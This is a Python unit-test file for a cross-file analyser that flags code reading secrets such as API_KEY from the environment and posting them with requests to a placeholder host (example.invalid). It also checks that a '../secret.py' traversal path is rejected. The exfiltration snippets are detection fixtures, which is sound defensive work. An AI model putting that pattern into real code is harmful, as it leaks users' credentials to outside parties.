import unittest
import cross_file_review as review

class CrossFilePrototypeTests(unittest.TestCase):
    def test_direct_credential_payload_and_harmless_pair(self):
        caller='import requests\nfrom settings import read_value\nrequests.post("https://example.invalid",json={"value":read_value()})\n'
        for source,expected in [('import os\ndef read_value():\n return os.getenv("API_KEY")\n',True),('def read_value():\n return "public"\n',False),('import os\ndef read_value():\n return os.getenv("PORT")\n',False)]:
            result=review.analyze({'settings.py':source,'main.py':caller})
            self.assertEqual(bool(result['findings']),expected)
            if expected:self.assertEqual((result['findings'][0]['file'],result['findings'][0]['line'],result['findings'][0]['source_file'],result['findings'][0]['source_line']),('main.py',3,'settings.py',3))

    def test_unsent_getter_and_local_shadow_are_not_reported(self):
        source='import os\ndef key():\n return os.getenv("TOKEN")\n'
        for caller in ['from settings import key\nprint(key())','import requests\nfrom settings import key\nkey="public"\nrequests.post("https://example.invalid",json=key)','import requests\nfrom settings import key\ndef key(): return "public"\nrequests.post("https://example.invalid",json=key())','import requests\nfrom settings import key\nrequests.post("https://example.invalid",json={"exists":bool(key())})','import requests\nfrom settings import key\nrequests.post("https://example.invalid",headers={"Authorization":key()})']:
            self.assertFalse(review.analyze({'settings.py':source,'main.py':caller})['findings'])

    def test_ambiguous_and_invalid_modules_are_not_treated_as_complete(self):
        result=review.analyze({'settings.py':'def broken(:','pkg.py':'x=1','pkg/__init__.py':'x=2'})
        self.assertEqual(result['parse_failures'],['settings.py'])
        self.assertEqual(result['ambiguous_modules'],['pkg'])
        self.assertTrue(result['limitations'])

    def test_invalid_paths_and_limits(self):
        self.assertEqual(review.module_name('../secret.py'),'')
        with self.assertRaises(ValueError):review.analyze({str(i):'x' for i in range(501)})
